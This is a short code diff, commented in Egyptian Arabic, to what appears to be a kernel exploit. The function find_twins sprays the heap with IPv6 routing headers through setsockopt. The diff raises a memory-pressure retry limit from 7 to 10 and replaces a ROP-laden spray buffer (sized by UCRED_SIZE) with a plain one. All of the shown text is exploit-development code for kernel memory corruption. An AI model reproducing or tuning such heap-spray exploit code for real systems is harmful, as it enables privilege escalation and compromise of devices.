@@ -889,7 +889,7 @@ function find_twins() {
 
       zeroMemoryCount++;
 
-      if (zeroMemoryCount >= 7) {   // ← ← ← التحكم في تخفيف الضغط
+      if (zeroMemoryCount >= 10) {   // ← ← ← التحكم في تخفيف الضغط
         log("[TWINS] MEMORY LIMIT REACHED");
         cleanup();                  // ← ← ← ده اللي بيخفف الضغط
         return false;
@@ -923,8 +923,10 @@ function find_twins() {
       // ↑ ↑ ↑ كل استدعاء = allocation جديد
       // Using pre-filled buffer to spray
       // set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
-      setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
+      //setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
+      setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr, spray_rthdr_len);
     }
+
     // ============================================================
     // 4) المرحلة الثانية: القراءة + القرار
     //    هنا مفيش ضغط… ده تحليل للنتيجة فقط
